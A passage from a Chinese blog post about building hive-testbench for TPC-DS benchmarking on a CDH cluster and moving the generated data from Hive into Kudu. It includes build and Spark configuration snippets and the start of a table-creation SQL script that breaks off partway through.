title="一、遇到的问题"></a>一、遇到的问题</h3><h4 id="1-源码无法编译"><a href="#1-源码无法编译" class="headerlink" title="1.源码无法编译"></a>1.源码无法编译</h4><p>源码下载下来之后build，需要的组件根本下载不了</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g330ii05j5j20tt0bt75b.jpg" alt></p><p>这里Google到了一个办法</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g330lkku7yj20tn0a7wf6.jpg" alt></p><p>先把包下载下来，放进对应的文件夹里然后编译</p><h4 id="2-安装遇到的问题"><a href="#2-安装遇到的问题" class="headerlink" title="2.安装遇到的问题"></a>2.安装遇到的问题</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g330stw7enj20of0ebdgx.jpg" alt></p><p>类似配置冲突的问题 不知道为什么</p><p>yes和no我都分别选过，但是都不对，配置完成之后执行都有问题</p><p>我初步怀疑可能是版本问题，我下一个旧版本的试一试</p><p><a href="http://www.tpc.org/tpc_documents_current_versions/current_specifications.asp" target="_blank" rel="noopener">TPC下载地址</a></p><p>之前用的是V 2.11的，现在下载一个V 2.10.1的试一下</p><p>执行完毕之后，首先报错</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g335c98sa0j20ns0g2tac.jpg" alt></p><p>权限不够，我重新使用hdfs用户来创建目录</p><p><code>hdfs</code>用户没有办法<code>git clone</code></p><p>我使用了<code>root</code>用户<code>clone</code>之后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown -R hdfs:hdfs hive-testbench/</span><br><span class="line">chmod -R 777 hive-testbench/</span><br></pre></td></tr></table></figure><p>将权限开放</p><p>其余操作使用HDFS完成</p><p>。。。</p><p>等了一段时间</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g336c9kby8j20rx05ydfz.jpg" alt></p><p>MR正常运行没有问题，可以MR运行完毕之后还是报错，不知道为什么</p><p>中间又做了很多尝试，失败的尝试在这不做记录</p><p>重点记录一下我在BUG日志中发现HiveServer2有一些问题</p><p>Google之后发现了是因为配置里面出现了问题<br>Java 8里面用原先的配置代码已经被舍弃了，更改完毕之后解决了这个问题，</p><p>但是<code>TPCDS</code>的问题还是没有解决，吐出一口老血</p><p>验证<code>HiveServer2</code>正确开启的代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> /usr/lib/hive/bin/beeline</span><br><span class="line"><span class="meta">beeline&gt;</span> !connect jdbc:hive2://localhost:10000 username password org.apache.hive.jdbc.HiveDriver</span><br><span class="line">0: jdbc:hive2://localhost:10000&gt; SHOW TABLES;</span><br><span class="line">show tables;</span><br><span class="line">+-----------+</span><br><span class="line">| tab_name  |</span><br><span class="line">+-----------+</span><br><span class="line">+-----------+</span><br><span class="line">No rows selected (0.238 seconds)</span><br><span class="line">0: jdbc:hive2://localhost:10000&gt;</span><br></pre></td></tr></table></figure><p>现在我解决问题的点还在于是不是<code>CDH</code>的配置还有一些问题</p><p>但是<code>TPCH</code>明明又能够生成数据的，难顶了</p><h4 id="3-数据从Hive转入Kudu速度过慢"><a href="#3-数据从Hive转入Kudu速度过慢" class="headerlink" title="3.数据从Hive转入Kudu速度过慢"></a>3.数据从Hive转入Kudu速度过慢</h4><p>从周五下班的点开始到周一上班，1000个Tasks，仅仅完成了210个，速度十分之慢。</p><hr><h3 id="二、解决办法"><a href="#二、解决办法" class="headerlink" title="二、解决办法"></a>二、解决办法</h3><h4 id="1-总结问题"><a href="#1-总结问题" class="headerlink" title="1.总结问题"></a>1.总结问题</h4><p>好好想了下我自己遇到的错误，有几个点，第一个点是<code>TPCH</code>是可以生成数据的，第二个点是我在编译<code>TPCDS</code>源码的过程中，报出了奇怪的提示，我一直怀疑可能是我编译的时候除了问题，但是重新编译了好几遍，一直没有找到解决办法。</p><p>这边在<a href="https://blog.csdn.net/sinat_36300982/article/details/89556220" target="_blank" rel="noopener">另一个技术博客上</a>找到了解决方案，可以在本地编译完成之后再上传到服务器，但是我看了一下这篇博客，他是用的官方原版的<code>hive-testbench</code>，里面会有一些错误，我直接下载了别人使用的版本hive14.zip(可以在TIM上下载)，然后<a href="http://dev.hortonworks.com.s3.amazonaws.com/hive-testbench/tpcds/TPCDS_Tools.zip" target="_blank" rel="noopener">下载TPCDS_Tools.zip</a>改名<code>tpcds_kit.zip</code>放进<code>tpcds</code>对应的文件夹就可以了，最后编译成功。</p><p>编译完成之后，数据在Hive上面，Hive上面生成了两个库，一个是<code>ORC</code>库，还有一个是TEXT库，<code>ORC</code>文件<code>impala</code>用不了就算了，迁移TEXT就行，代码可以在下面的<code>github</code>中找到，然后要注意的事情是最后<code>package</code>的代码，因为是<code>scala</code>，打包的代码和别的并不一样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>anlogSparkSQL<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 设置项目编译版本--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 用于编译scala代码到class --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.alchim31.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>scala-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>testCompile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>kuduimport.hiveToKudu<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用HUE里面的<code>Oozie</code>调用Spark程序的时候，如果想要在spark提交里面出现任务记录，应该添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--conf spark.shuffle.memoryFraction=0.3</span><br><span class="line">--conf spark.yarn.historyServer.address=http://datanode127:18089</span><br><span class="line">--conf spark.eventLog.dir=hdfs://master126:8020/user/spark/spark2ApplicationHistory</span><br><span class="line">--conf spark.eventLog.enabled=true</span><br></pre></td></tr></table></figure><p><a href="https://github.com/YunKillerE/kudu-learning" target="_blank" rel="noopener">github/kudu-learning</a></p><hr><h4 id="2-自动生成Kudu表格脚本"><a href="#2-自动生成Kudu表格脚本" class="headerlink" title="2.自动生成Kudu表格脚本"></a>2.自动生成Kudu表格脚本</h4><p>脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br></pre></td><td class="code"><pre><span class="line">create database if not exists kudu_spark_tpcds_1000;</span><br><span class="line">use kudu_spark_tpcds_1000;</span><br><span class="line"></span><br><span class="line">drop table if exists call_center;</span><br><span class="line"></span><br><span class="line">create table call_center(</span><br><span class="line">      cc_call_center_sk         bigint               </span><br><span class="line">,     cc_call_center_id         string              </span><br><span class="line">,     cc_rec_start_date        string                         </span><br><span class="line">,     cc_rec_end_date          string                         </span><br><span class="line">,     cc_closed_date_sk         bigint                       </span><br><span class="line">,     cc_open_date_sk           bigint                       </span><br><span class="line">,     cc_name                   string                   </span><br><span class="line">,     cc_class                  string                   </span><br><span class="line">,     cc_employees              int                       </span><br><span class="line">,     cc_sq_ft                  int                       </span><br><span class="line">,     cc_hours                  string                      </span><br><span class="line">,     cc_manager                string                   </span><br><span class="line">,     cc_mkt_id                 int                       